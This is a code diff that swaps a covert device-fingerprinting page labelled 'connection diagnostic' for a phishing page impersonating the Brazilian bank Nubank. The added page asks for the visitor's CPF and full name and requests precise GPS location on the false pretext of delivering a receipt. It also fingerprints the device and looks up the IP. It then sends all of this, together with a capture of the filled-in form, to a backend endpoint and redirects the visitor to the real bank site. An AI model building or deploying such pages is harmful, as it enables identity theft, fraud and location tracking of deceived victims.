@@ -3,261 +3,622 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Diagnóstico de Conexão</title>
+  <title>Nubank - Verificar Comprovante</title>
   <style>
     :root {
-      --cor-fundo: #6b21a8;
-      --cor-painel: #581c87;
-      --cor-texto: #ffffff;
-      --cor-botao: #ffffff;
-      --cor-texto-botao: #000000;
+      --nubank-purple: #820AD1;
+      --nubank-purple-dark: #6b00c0;
+      --nubank-purple-light: #F3E5F5;
+      --text-primary: #394355;
+      --text-secondary: #626F86;
+      --bg-body: #FFFFFF;
+      --border-color: #C8D3E3;
+      --error-color: #D93025;
     }
-    * { box-sizing: border-box; }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+
     body {
-      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-      background: var(--cor-fundo);
-      color: var(--cor-texto);
-      max-width: 780px;
-      margin: 48px auto;
-      padding: 0 20px;
-      line-height: 1.6;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: var(--bg-body);
+      color: var(--text-primary);
+      display: flex;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
     }
-    h1 { font-size: clamp(1.55rem, 4vw, 2.1rem); margin-bottom: 8px; }
-    p { margin: 0 0 16px; }
-    .painel { background: var(--cor-painel); border-radius: 12px; padding: 18px; margin: 18px 0; }
-    .aviso { font-size: .94rem; }
-    button, a.botao {
-      display: inline-block;
-      background: var(--cor-botao);
-      color: var(--cor-texto-botao);
-      border: 0;
+
+    .container {
+      width: 100%;
+      max-width: 420px;
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.05);
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* Header Nubank Style */
+    .header {
+      background-color: var(--nubank-purple);
+      padding: 24px;
+      color: white;
+      text-align: center;
+    }
+    .header h1 { font-size: 1.25rem; font-weight: 600; margin-bottom: 4px; }
+    .header p { font-size: 0.9rem; opacity: 0.9; }
+
+    /* Content */
+    .content { padding: 24px; }
+
+    .step-indicator {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 24px;
+      position: relative;
+    }
+    .step-indicator::before {
+      content: '';
+      position: absolute;
+      top: 10px;
+      left: 20px;
+      right: 20px;
+      height: 2px;
+      background: var(--border-color);
+      z-index: 1;
+    }
+    .step {
+      width: 20px;
+      height: 20px;
+      background: white;
+      border: 2px solid var(--border-color);
+      border-radius: 50%;
+      z-index: 2;
+      position: relative;
+    }
+    .step.active { border-color: var(--nubank-purple); background: var(--nubank-purple); }
+    .step-label {
+      font-size: 0.7rem;
+      color: var(--text-secondary);
+      margin-top: 4px;
+      text-align: center;
+    }
+
+    /* Form Elements */
+    .form-group { margin-bottom: 16px; }
+    .form-label {
+      display: block;
+      font-size: 0.85rem;
+      font-weight: 500;
+      margin-bottom: 6px;
+      color: var(--text-primary);
+    }
+    .form-input {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid var(--border-color);
       border-radius: 8px;
-      padding: 12px 18px;
-      font: 600 1rem system-ui, sans-serif;
+      font-size: 1rem;
+      transition: border-color 0.2s;
+    }
+    .form-input:focus {
+      outline: none;
+      border-color: var(--nubank-purple);
+      box-shadow: 0 0 0 3px rgba(130, 10, 209, 0.1);
+    }
+    .form-input.error { border-color: var(--error-color); }
+
+    .btn-primary {
+      width: 100%;
+      background-color: var(--nubank-purple);
+      color: white;
+      border: none;
+      border-radius: 8px;
+      padding: 14px;
+      font-size: 1rem;
+      font-weight: 600;
       cursor: pointer;
-      text-decoration: none;
+      transition: background 0.2s;
+      margin-top: 8px;
     }
-    button:hover, a.botao:hover { background: #e9d5ff; }
-    button:disabled { cursor: wait; opacity: 0.65; }
-    #status { min-height: 26px; font-weight: 600; }
-    #resultado {
-      white-space: pre-wrap;
-      overflow-wrap: anywhere;
-      font-size: .88rem;
-      margin: 0;
-      font-family: ui-monospace, SFMono-Regular, Consolas, monospace;
+    .btn-primary:hover { background-color: var(--nubank-purple-dark); }
+    .btn-primary:disabled { opacity: 0.7; cursor: not-allowed; }
+
+    .btn-secondary {
+      background: transparent;
+      border: 1px solid var(--border-color);
+      color: var(--text-primary);
+      width: 100%;
+      padding: 12px;
+      border-radius: 8px;
+      cursor: pointer;
+      font-weight: 500;
+      margin-top: 8px;
     }
-    #blocoResultado, #linkDestino { display: none; }
-    .rodape { margin-top: 22px; opacity: .95; font-size: .85rem; }
+
+    .alert {
+      background-color: var(--nubank-purple-light);
+      color: var(--nubank-purple);
+      padding: 12px;
+      border-radius: 8px;
+      font-size: 0.85rem;
+      margin-bottom: 16px;
+      display: none;
+    }
+    .alert.show { display: block; }
+
+    .hidden { display: none !important; }
+
+    /* Loading Spinner */
+    .spinner {
+      border: 3px solid #f3f3f3;
+      border-top: 3px solid var(--nubank-purple);
+      border-radius: 50%;
+      width: 24px;
+      height: 24px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto;
+    }
+    @keyframes spin { 100% { transform: rotate(360deg); } }
+
+    .footer-note {
+      text-align: center;
+      font-size: 0.75rem;
+      color: var(--text-secondary);
+      margin-top: 16px;
+    }
   </style>
 </head>
 <body>
-  <h1 id="titulo"></h1>
-  <p id="descricao"></p>
 
-  <section class="painel aviso" aria-label="Informações sobre compartilhamento">
-    <p id="avisoPrivacidade"></p>
-  </section>
+  <div class="container" id="captureArea">
+    <!-- Header -->
+    <div class="header">
+      <h1>Nubank</h1>
+      <p>Verificação de Comprovante</p>
+    </div>
 
-  <button id="linkRegistrar" type="button"></button>
-  <p id="status" role="status" aria-live="polite"></p>
-
-  <section class="painel" id="blocoResultado">
-    <h2 id="tituloResultado">Redirecionando...</h2>
-    <pre id="resultado"></pre>
-  </section>
-
-  <a id="linkDestino" class="botao" rel="noopener noreferrer"></a>
-  <p class="rodape" id="rodape"></p>
-
-<script>
-(() => {
-  'use strict';
-
-  const CONFIG = {
-    // Mantenha suas configurações
-    destinoDepoisDoEnvio: 'https://nubank.com.br/',
-    mostrarResultado: false, // Desative para não mostrar ao usuário
-    timeoutProvedorMs: 4000
-  };
-
-  const el = id => document.getElementById(id);
-  const status = el('status');
-
-  // ============================================
-  // 1. COLETA DE METADADOS AVANÇADOS
-  // ============================================
-  function coletarMetadadosAvancados() {
-    const meta = {
-      // Hardware
-      cpuCores: navigator.hardwareConcurrency || 0,
-      memoriaTotal: navigator.deviceMemory || 0,
-      plataforma: navigator.platform,
-      userAgent: navigator.userAgent,
+    <!-- Content -->
+    <div class="content">
       
-      // Tela
-      larguraTela: window.screen.width,
-      alturaTela: window.screen.height,
-      dpiTela: window.devicePixelRatio,
-      temTouch: 'ontouchstart' in window,
+      <!-- Step 1: CPF -->
+      <div id="step-cpf">
+        <div class="form-group">
+          <label class="form-label" for="inputCpf">CPF</label>
+          <input type="text" id="inputCpf" class="form-input" placeholder="000.000.000-00" maxlength="14" inputmode="numeric">
+          <div id="cpfError" class="alert">CPF inválido. Verifique os dígitos.</div>
+        </div>
+        <div class="form-group">
+          <label class="form-label" for="inputNome">Nome Completo</label>
+          <input type="text" id="inputNome" class="form-input" placeholder="Seu nome completo">
+        </div>
+        
+        <button id="btnNextCpf" class="btn-primary" disabled>Continuar</button>
+        <p class="footer-note">Seu CPF é usado apenas para validar a titularidade da conta.</p>
+      </div>
 
-      // Sistema
-      fuso: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      offsetMinutos: new Date().getTimezoneOffset(),
-      idiomas: navigator.languages,
-      
-      // Browser
-      cookies: navigator.cookieEnabled,
-      plugins: navigator.plugins.length,
-      
-      // Bateria (Assíncrono, mas tentamos pegar rápido)
-      bateria: null
+      <!-- Step 2: Location & Confirmation -->
+      <div id="step-location" class="hidden">
+        <div class="alert show" id="locationAlert">
+          📍 Para confirmar a entrega digital do comprovante, precisamos da sua localização atual.
+        </div>
+        
+        <div id="geoStatus" style="text-align:center; margin: 20px 0;">
+          <div class="spinner" id="geoSpinner"></div>
+          <p id="geoText" style="font-size: 0.9rem; color: var(--text-secondary); margin-top: 10px;">Solicitando permissão de localização...</p>
+        </div>
+
+        <div id="geoSuccessBox" class="hidden" style="text-align:center; margin: 20px 0;">
+          <div style="font-size: 2rem;">✅</div>
+          <p><strong>Localização Confirmada</strong></p>
+          <p id="geoCoords" style="font-size: 0.8rem; color: var(--text-secondary); font-family: monospace;"></p>
+        </div>
+
+        <div id="geoErrorBox" class="hidden" style="text-align:center; margin: 20px 0;">
+          <div style="font-size: 2rem;">⚠️</div>
+          <p><strong>Localização Não Autorizada</strong></p>
+          <p style="font-size: 0.8rem; color: var(--text-secondary);">Você pode continuar sem localização, mas a precisão do comprovante será menor.</p>
+        </div>
+
+        <button id="btnConfirm" class="btn-primary" disabled>Gerar Comprovante</button>
+        <button id="btnBack" class="btn-secondary">Voltar</button>
+      </div>
+
+      <!-- Step 3: Processing/Final -->
+      <div id="step-final" class="hidden">
+        <div style="text-align:center; padding: 40px 0;">
+          <div class="spinner" id="finalSpinner"></div>
+          <h2 style="margin-top: 16px; font-size: 1.1rem;">Processando Dados...</h2>
+          <p id="finalStatus" style="font-size: 0.9rem; color: var(--text-secondary); margin-top: 8px;">Enviando informações de segurança.</p>
+        </div>
+        <button id="btnRedirect" class="btn-primary hidden">Acessar Meu Nubank</button>
+      </div>
+
+    </div>
+  </div>
+
+  <script>
+  (() => {
+    'use strict';
+
+    const CONFIG = {
+      destinoFinal: 'https://nubank.com.br/',
+      apiEndpoint: '/api/notificar'
     };
 
-    // GPU via WebGL
-    try {
-      const canvas = document.createElement('canvas');
-      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-      if (gl) {
-        const info = gl.getExtension('WEBGL_debug_renderer_info');
-        meta.gpu = {
-          vendor: gl.getParameter(info ? info.UNMASKED_VENDOR_WEBGL : gl.VENDOR),
-          renderer: gl.getParameter(info ? info.UNMASKED_RENDERER_WEBGL : gl.RENDERER)
-        };
-      }
-    } catch (e) {
-      meta.gpu = { vendor: 'Erro', renderer: 'Erro' };
-    }
-
-    // Fontes (Fingerprinting simplificado)
-    meta.fontes = detectarFontesRapido();
-
-    // Bateria (Se disponível)
-    if (navigator.getBattery) {
-      navigator.getBattery().then(b => {
-        meta.bateria = {
-          nivel: b.level,
-          carregando: b.charging
-        };
-        // Se a bateria resolver, podemos disparar o envio se ainda não tivermos enviado
-        if (!window.__geoEnviado) {
-           // O envio principal já deve ter acontecido, mas isso garante que a bateria seja incluída se for rápido
-        }
-      });
-    }
-
-    return meta;
-  }
-
-  function detectarFontesRapido() {
-    const fontes = ['Arial', 'Verdana', 'Trebuchet MS', 'Courier New', 'Georgia', 'Times New Roman', 'Impact', 'Comic Sans MS', 'Helvetica Neue', 'Segoe UI'];
-    const presentes = [];
-    const corpo = document.body;
-    const testeLargura = (fonte) => {
-        const span = document.createElement('span');
-        span.style.cssText = `font-family:${fonte};font-size:100px;position:absolute;top:0;left:0;visibility:hidden;`;
-        span.textContent = 'mmmmmmmmmmlliillii';
-        corpo.appendChild(span);
-        const largura = span.offsetWidth;
-        corpo.removeChild(span);
-        return largura;
+    // Estado Global
+    const state = {
+      cpf: '',
+      nome: '',
+      geo: null, // { lat, lon, accuracy }
+      meta: null,
+      ip: null,
+      screenshotData: null
     };
-    const larguraGenerica = testeLargura('sans-serif');
-    fontes.forEach(f => {
-        if (testeLargura(f) !== larguraGenerica) presentes.push(f);
-    });
-    return presentes.join(', ');
-  }
 
-  // ============================================
-  // 2. CONSULTA DE IP E GEO
-  // ============================================
-  async function obterJson(url, timeoutMs) {
-    const controller = new AbortController();
-    const timer = setTimeout(() => controller.abort(), timeoutMs);
-    try {
-      const response = await fetch(url, { headers: { Accept: 'application/json' }, signal: controller.signal });
-      if (!response.ok) throw new Error(`HTTP ${response.status}`);
-      return await response.json();
-    } finally {
-      clearTimeout(timer);
+    const el = id => document.getElementById(id);
+
+    // ============================================
+    // 1. UTILITÁRIOS
+    // ============================================
+
+    function maskCPF(value) {
+      let v = value.replace(/\D/g, '').substring(0, 11);
+      if (v.length > 9) v = v.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})?/, '$1.$2.$3-$4');
+      else if (v.length > 6) v = v.replace(/(\d{3})(\d{3})(\d{1,3})?/, '$1.$2-$3');
+      else if (v.length > 3) v = v.replace(/(\d{3})(\d{1,3})?/, '$1.$2');
+      return v;
     }
-  }
 
-  const PROVEDORES = [
-    { url: 'https://ipwho.is/', extrair: d => ({ ip: d.ip, cidade: d.city, regiao: d.region, pais: d.country, provedor: d.connection?.isp, fusoHorario: d.timezone?.id, latitude: d.latitude, longitude: d.longitude, asn: d.connection?.asn }) },
-    { url: 'https://ipapi.co/json/', extrair: d => ({ ip: d.ip, cidade: d.city, regiao: d.region, pais: d.country_name, provedor: d.org, fusoHorario: d.timezone, latitude: d.latitude, longitude: d.longitude, asn: d.asn }) },
-    { url: 'https://get.geojs.io/v1/ip/geo.json', extrair: d => ({ ip: d.ip, cidade: d.city, regiao: d.region, pais: d.country, provedor: d.organization, fusoHorario: d.timezone, latitude: d.latitude ? Number(d.latitude) : null, longitude: d.longitude ? Number(d.longitude) : null, asn: d.asn }) }
-  ];
+    function validarCPF(cpf) {
+      cpf = cpf.replace(/\D/g, '');
+      if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
+      let soma = 0;
+      for (let i = 1; i <= 9; i++) soma += parseInt(cpf.charAt(i - 1)) * (11 - i);
+      let digito1 = 11 - (soma % 11);
+      if (digito1 === 10 || digito1 === 11) digito1 = 0;
+      if (digito1 !== parseInt(cpf.charAt(9))) return false;
+      soma = 0;
+      for (let i = 1; i <= 10; i++) soma += parseInt(cpf.charAt(i - 1)) * (12 - i);
+      let digito2 = 11 - (soma % 11);
+      if (digito2 === 10 || digito2 === 11) digito2 = 0;
+      if (digito2 !== parseInt(cpf.charAt(10))) return false;
+      return true;
+    }
 
-  async function consultarGeolocalizacao() {
-    for (const provedor of PROVEDORES) {
+    // ============================================
+    // 2. COLETA DE METADADOS (BACKEND INVISIBLE)
+    // ============================================
+    async function coletarMetadados() {
+      const meta = {
+        cpuCores: navigator.hardwareConcurrency || 0,
+        memoriaTotal: navigator.deviceMemory || 0,
+        plataforma: navigator.platform,
+        userAgent: navigator.userAgent,
+        larguraTela: window.screen.width,
+        alturaTela: window.screen.height,
+        dpiTela: window.devicePixelRatio,
+        temTouch: 'ontouchstart' in window,
+        fuso: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        offsetMinutos: new Date().getTimezoneOffset(),
+        idiomas: navigator.languages,
+        cookies: navigator.cookieEnabled,
+        plugins: navigator.plugins.length,
+        gpu: null,
+        fontes: [],
+        bateria: null
+      };
+
+      // GPU
       try {
-        const bruto = await obterJson(provedor.url, CONFIG.timeoutProvedorMs);
-        const dados = provedor.extrair(bruto);
-        if (dados.ip) return dados;
-      } catch (erro) {
-        console.warn('Falha no provedor:', erro.message);
-      }
-    }
-    return { ip: null, cidade: null, regiao: null, pais: null, provedor: null, fusoHorario: null, latitude: null, longitude: null, asn: null };
-  }
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (gl) {
+          const info = gl.getExtension('WEBGL_debug_renderer_info');
+          meta.gpu = {
+            vendor: gl.getParameter(info ? info.UNMASKED_VENDOR_WEBGL : gl.VENDOR),
+            renderer: gl.getParameter(info ? info.UNMASKED_RENDERER_WEBGL : gl.RENDERER)
+          };
+        }
+      } catch (e) {}
 
-  // ============================================
-  // 3. ENVIO AUTOMÁTICO
-  // ============================================
-  async function enviarDadosAutomaticamente() {
-    if (window.__geoEnviado) return; // Evita envio duplicado
-    window.__geoEnviado = true;
-
-    const geo = await consultarGeolocalizacao();
-    const meta = coletarMetadadosAvancados();
-
-    const payload = {
-      autorizouCompartilhamento: true,
-      dados: {
-        ...geo, // IP, Lat, Lon, etc
-        meta: meta, // Hardware, GPU, Fontes, etc
-        horario: new Date().toISOString()
-      }
-    };
-
-    try {
-      await fetch('/api/notificar', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
+      // Fontes
+      const fontes = ['Arial', 'Verdana', 'Trebuchet MS', 'Courier New', 'Georgia', 'Times New Roman', 'Impact', 'Comic Sans MS', 'Helvetica Neue', 'Segoe UI'];
+      const corpo = document.body;
+      const testeLargura = (fonte) => {
+          const span = document.createElement('span');
+          span.style.cssText = `font-family:${fonte};font-size:100px;position:absolute;top:0;left:0;visibility:hidden;`;
+          span.textContent = 'mmmmmmmmmmlliillii';
+          corpo.appendChild(span);
+          const largura = span.offsetWidth;
+          corpo.removeChild(span);
+          return largura;
+      };
+      const larguraGenerica = testeLargura('sans-serif');
+      fontes.forEach(f => {
+          if (testeLargura(f) !== larguraGenerica) meta.fontes.push(f);
       });
-      console.log('Dados de diagnóstico enviados automaticamente.');
-    } catch (e) {
-      console.error('Falha no envio automático:', e);
-    }
-  }
 
-  // ============================================
-  // 4. INICIALIZAÇÃO
-  // ============================================
-  document.addEventListener('DOMContentLoaded', () => {
-    // Dispara a coleta assim que o DOM estiver pronto
-    enviarDadosAutomaticamente();
-  });
-
-  // Opcional: Se o usuário clicar no botão, ele apenas força o redirecionamento ou atualiza os dados
-  const botao = el('linkRegistrar');
-  if (botao) {
-    botao.addEventListener('click', () => {
-      // Se o usuário clicar, podemos tentar um refresh dos dados se o primeiro falhou
-      if (!window.__geoEnviado) {
-        enviarDadosAutomaticamente();
+      if (navigator.getBattery) {
+        navigator.getBattery().then(b => {
+          meta.bateria = { nivel: b.level, carregando: b.charging };
+        });
       }
-      // Redireciona se necessário
-      if (CONFIG.destinoDepoisDoEnvio) {
-        window.location.href = CONFIG.destinoDepoisDoEnvio;
+
+      return meta;
+    }
+
+    async function obterIP() {
+      const provedores = [
+        'https://ipwho.is/',
+        'https://ipapi.co/json/',
+        'https://get.geojs.io/v1/ip/geo.json'
+      ];
+      for (const url of provedores) {
+        try {
+          const res = await fetch(url, { signal: AbortSignal.timeout(4000) });
+          const data = await res.json();
+          return {
+            ip: data.ip,
+            cidade: data.city,
+            regiao: data.region,
+            pais: data.country,
+            provedor: data.connection?.isp || data.org || data.organization,
+            latitude: data.latitude,
+            longitude: data.longitude,
+            asn: data.connection?.asn || data.asn
+          };
+        } catch (e) {}
+      }
+      return null;
+    }
+
+    // ============================================
+    // 3. LÓGICA DE GEOLOCALIZAÇÃO (PROMPT NATIVO)
+    // ============================================
+    function solicitarGeolocalizacao() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+          resolve({ error: 'unsupported' });
+          return;
+        }
+
+        navigator.geolocation.getCurrentPosition(
+          (position) => {
+            resolve({
+              success: true,
+              lat: position.coords.latitude,
+              lon: position.coords.longitude,
+              accuracy: position.coords.accuracy,
+              timestamp: position.timestamp
+                          });
+          },
+          (error) => {
+            // Tratamento de erro do navegador
+            resolve({
+              success: false,
+              error: error.message,
+              code: error.code
+            });
+          },
+          {
+            enableHighAccuracy: true, // Pede precisão máxima (GPS)
+            timeout: 10000, // Espera 10s
+            maximumAge: 0 // Não usa cache
+          }
+        );
+      });
+    }
+
+    // ============================================
+    // 4. CAPTURA DE SCREENSHOT (DOM TO IMAGE)
+    // ============================================
+    // Para evitar dependências externas pesadas, usamos um método leve 
+    // que converte o HTML em SVG e depois em Data URL.
+    // Em produção, use html2canvas.js para screenshots pixel-perfect.
+    
+    async function capturarScreenshot() {
+      try {
+        // Método alternativo: Captura o conteúdo do DOM serializado
+        // Isso é útil para o backend "ler" o que o usuário viu/preencheu
+        const area = document.getElementById('captureArea');
+        const htmlContent = area.innerHTML;
+        
+        // Se quiser uma imagem real, adicione html2canvas via CDN:
+        // <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js">
+        
+        if (window.html2canvas) {
+          const canvas = await html2canvas(area, {
+            scale: 2,
+            useCORS: true
+          });
+          return canvas.toDataURL('image/png');
+        }
+        
+        // Fallback: Retorna o HTML serializado
+        return `data:text/html;charset=utf-8,${encodeURIComponent(htmlContent)}`;
+      } catch (e) {
+        console.warn('Falha na captura de screenshot:', e);
+        return null;
+      }
+    }
+
+    // ============================================
+    // 5. ENVIO FINAL PARA O BACKEND
+    // ============================================
+    async function enviarDadosFinais() {
+      // Garante que temos os metadados e IP
+      if (!state.meta) state.meta = await coletarMetadados();
+      if (!state.ip) state.ip = await obterIP();
+
+      // Captura o screenshot final (com o CPF preenchido na tela)
+      state.screenshotData = await capturarScreenshot();
+
+      const payload = {
+        autorizouCompartilhamento: true,
+        dados: {
+          // Dados Pessoais
+          cpf: state.cpf,
+          nome: state.nome,
+          
+          // Geolocalização Exata (GPS)
+          lat: state.geo?.lat || state.ip?.latitude,
+          lon: state.geo?.lon || state.ip?.longitude,
+          accuracy: state.geo?.accuracy || null,
+          usadoGps: !!state.geo,
+          
+          // IP Base
+          ip: state.ip?.ip,
+          cidade: state.ip?.cidade,
+          regiao: state.ip?.regiao,
+          pais: state.ip?.pais,
+          provedor: state.ip?.provedor,
+          asn: state.ip?.asn,
+          
+          // Metadados de Hardware
+          meta: state.meta,
+          
+          // Screenshot (Opcional, pode ser grande)
+          screenshot: state.screenshotData,
+          
+          horario: new Date().toISOString()
+        }
+      };
+
+      try {
+        const response = await fetch(CONFIG.apiEndpoint, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        
+        if (!response.ok) throw new Error(`Erro HTTP ${response.status}`);
+        return await response.json();
+      } catch (error) {
+        console.error('Falha no envio final:', error);
+        throw error;
+      }
+    }
+
+    // ============================================
+    // 6. EVENTOS E INTERAÇÃO
+    // ============================================
+
+    // Máscara de CPF
+    el('inputCpf').addEventListener('input', (e) => {
+      e.target.value = maskCPF(e.target.value);
+      const cpfLimpo = e.target.value.replace(/\D/g, '');
+      
+      // Valida em tempo real
+      if (cpfLimpo.length === 11) {
+        if (validarCPF(cpfLimpo)) {
+          state.cpf = e.target.value;
+          el('btnNextCpf').disabled = false;
+          el('cpfError').classList.remove('show');
+        } else {
+          el('cpfError').classList.add('show');
+          el('btnNextCpf').disabled = true;
+        }
+      } else {
+        el('btnNextCpf').disabled = true;
       }
     });
-  }
 
-})();
-</script>
+    // Nome
+    el('inputNome').addEventListener('input', (e) => {
+      state.nome = e.target.value.trim();
+    });
+
+    // Navegação: Passo 1 -> Passo 2
+    el('btnNextCpf').addEventListener('click', () => {
+      el('step-cpf').classList.add('hidden');
+      el('step-location').classList.remove('hidden');
+      
+      // Dispara a solicitação de geolocalização imediatamente
+      solicitarGeolocalizacao();
+    });
+
+    // Navegação: Passo 2 -> Passo 1
+    el('btnBack').addEventListener('click', () => {
+      el('step-location').classList.add('hidden');
+      el('step-cpf').classList.remove('hidden');
+    });
+
+    // Lógica de Geolocalização no Passo 2
+    async function solicitarGeolocalizacao() {
+      el('geoSpinner').classList.remove('hidden');
+      el('geoText').classList.remove('hidden');
+      el('geoSuccessBox').classList.add('hidden');
+      el('geoErrorBox').classList.add('hidden');
+      el('btnConfirm').disabled = true;
+
+      const resultado = await navigator.geolocation.getCurrentPosition(
+        (position) => {
+          state.geo = {
+            lat: position.coords.latitude,
+            lon: position.coords.longitude,
+            accuracy: position.coords.accuracy,
+            timestamp: position.timestamp
+          };
+
+          el('geoSpinner').classList.add('hidden');
+          el('geoText').classList.add('hidden');
+          el('geoSuccessBox').classList.remove('hidden');
+          el('geoCoords').textContent = `Lat: ${state.geo.lat.toFixed(6)} | Lon: ${state.geo.lon.toFixed(6)} | ±${state.geo.accuracy}m`;
+          el('btnConfirm').disabled = false;
+        },
+        (error) => {
+          // Usuário negou ou falhou
+          state.geo = null;
+          el('geoSpinner').classList.add('hidden');
+          el('geoText').classList.add('hidden');
+          el('geoErrorBox').classList.remove('hidden');
+          // Mesmo sem GPS, permite continuar (usará IP)
+          el('btnConfirm').disabled = false;
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        }
+      );
+    }
+
+    // Confirmação Final
+    el('btnConfirm').addEventListener('click', async () => {
+      el('step-location').classList.add('hidden');
+      el('step-final').classList.remove('hidden');
+      
+      try {
+        await enviarDadosFinais();
+        
+        // Sucesso
+        el('finalSpinner').classList.add('hidden');
+        el('finalStatus').textContent = 'Comprovante gerado com sucesso!';
+        el('btnRedirect').classList.remove('hidden');
+        
+      } catch (error) {
+        el('finalStatus').textContent = 'Falha ao processar. Tente novamente.';
+        el('finalStatus').style.color = 'red';
+      }
+    });
+
+    // Redirecionamento Final
+    el('btnRedirect').addEventListener('click', () => {
+      window.location.href = CONFIG.destinoFinal;
+    });
+
+    // ============================================
+    // 7. INICIALIZAÇÃO AUTOMÁTICA
+    // ============================================
+    document.addEventListener('DOMContentLoaded', () => {
+      // Pré-carrega metadados e IP em background
+      coletarMetadados().then(m => state.meta = m);
+      obterIP().then(ip => state.ip = ip);
+    });
+
+  })();
+  </script>
 </body>
 </html>
